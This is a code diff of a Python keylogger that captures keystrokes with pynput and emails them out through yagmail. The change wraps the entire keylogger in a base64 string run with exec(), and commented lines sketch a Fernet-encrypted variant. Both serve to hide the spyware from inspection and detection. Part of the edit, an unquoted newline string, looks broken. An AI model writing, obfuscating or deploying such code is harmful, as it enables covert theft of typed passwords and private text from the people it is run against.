@@ -1,13 +1,17 @@
-import pynput
+
+
+from cryptography.fernet import Fernet
+import base64
+
+your_code = base64.b64encode(b"""import pynput
 from pynput.keyboard import Listener, Key
 import socket as s
 import email
 import yagmail
 import datetime as dt
 import platform as p
-
-today=dt.datetime.now().strftime('%Y-%m-%d at %H:%M')
-r=('\n')*4
+today=dt.datetime.now().strftime('%Y-%m at %H:%M')
+r=(\n)*4
 
 class Email:
     def __init__(self,email):
@@ -55,6 +59,15 @@ with Listener(on_press = press, on_release = release) as listener:
 print(TestoEmail.testo)   
 TestoEmail.testo
 sendemail.send_email(TestoEmail.testo.replace("'","")) 
+""")
 
+exec(base64.b64decode(your_code))
 
+# key = Fernet.generate_key()
+# encryption_type = Fernet(key)
+# encrypted_message = encryption_type.encrypt(code)
+
+# decrypted_message = encryption_type.decrypt(encrypted_message)
+
+# exec(decrypted_message)
 
